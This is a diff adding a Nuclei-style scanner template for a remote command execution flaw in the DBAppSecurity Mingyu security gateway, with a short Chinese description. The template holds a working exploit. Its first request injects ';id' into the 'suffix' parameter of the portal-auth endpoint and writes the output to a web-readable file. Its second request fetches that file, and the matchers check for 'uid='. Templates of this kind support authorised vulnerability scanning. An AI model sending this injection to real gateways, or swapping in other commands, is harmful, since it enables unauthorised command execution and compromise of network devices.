@@ -1,0 +1,40 @@
+id: dbappsecurity-gateway-rce
+
+info:
+  name: "安恒明御安全网关远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+      reference: 
+        - https://www.example.com/cve-details
+      details: 
+        - 漏洞影响安恒明御安全网关特定版本的命令执行逻辑
+        - 攻击者可通过构造恶意请求触发操作系统命令注入
+        - 漏洞利用可能导致目标系统权限被非授权提升
+  tags: 安恒明御安全网关
+
+variables:
+  filename: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%3Bid%3E/usr/local/webui/{{filename}}.txt%3B HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+      - |
+        GET /{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
